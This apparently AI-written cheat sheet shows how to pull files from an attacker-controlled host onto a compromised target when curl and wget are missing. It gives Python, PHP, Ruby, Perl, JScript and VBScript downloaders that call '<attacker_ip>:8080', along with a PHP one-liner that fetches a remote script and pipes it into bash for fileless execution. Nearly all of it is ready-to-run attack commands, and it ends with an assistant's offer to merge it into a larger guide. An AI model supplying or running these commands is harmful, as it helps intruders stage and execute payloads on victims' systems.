

When `curl` or `wget` are unavailable, you can still transfer files using built-in interpreters like **Python, PHP, Ruby, Perl, JavaScript, or VBScript**.

---

## **1. Python File Transfers**

### **Python 2.7**

**On Attacker (hosting file):**

```bash
python2.7 -m SimpleHTTPServer 8080
```

**On Target (downloading):**

```bash
python2.7 -c 'import urllib; urllib.urlretrieve("http://<attacker_ip>:8080/file.sh", "file.sh")'
```

---

### **Python 3**

**On Attacker:**

```bash
python3 -m http.server 8080
```

**On Target:**

```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<attacker_ip>:8080/file.sh", "file.sh")'
```

---

## **2. PHP File Transfers**

### **A. Quick Download & Save**

**On Target:**

```bash
php -r '$file = file_get_contents("http://<attacker_ip>:8080/file.sh"); file_put_contents("file.sh", $file);'
```

---

### **B. Buffered Download for Large Files**

**On Target:**

```bash
php -r 'const BUFFER = 1024; $fremote = fopen("http://<attacker_ip>:8080/file.sh", "rb"); $flocal = fopen("file.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

---

### **C. Fileless Execution (Download → Pipe → Execute)**

**On Target:**

```bash
php -r '$lines = @file("http://<attacker_ip>:8080/file.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

---

## **3. Ruby File Transfer**

**On Target:**

```bash
ruby -e 'require "net/http"; File.write("file.sh", Net::HTTP.get(URI.parse("http://<attacker_ip>:8080/file.sh")))'
```

---

## **4. Perl File Transfer**

**On Target:**

```bash
perl -e 'use LWP::Simple; getstore("http://<attacker_ip>:8080/file.sh", "file.sh");'
```

---

## **5. JavaScript File Transfer (Windows)**

When `cscript.exe` is available (Windows), you can script downloads.

### **Step 1: Create wget.js**

Create a file named `wget.js` with:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1; // binary
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

---

### **Step 2: Execute**

**On Target (Windows CMD or PowerShell):**

```cmd
cscript.exe /nologo wget.js http://<attacker_ip>:8080/file.ps1 file.ps1
```

---

## **6. VBScript File Transfer (Windows)**

### **Step 1: Create wget.vbs**

Save the following as `wget.vbs`:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

---

### **Step 2: Execute**

**On Target:**

```cmd
cscript.exe /nologo wget.vbs http://<attacker_ip>:8080/file.ps1 file.ps1
```

---

### **Bonus Tip**

If HTTPS fails on older systems, switch to HTTP by hosting files locally:  
**On Attacker:**

```bash
python3 -m http.server 8080
```

**On Target:**

```cmd
cscript.exe /nologo wget.vbs http://<attacker_ip>:8080/file.ps1 file.ps1
```

---

Would you like me to integrate this with your Netcat, PowerShell Remoting, and Nginx HTTP/S transfer guides into a **single unified cheat sheet**?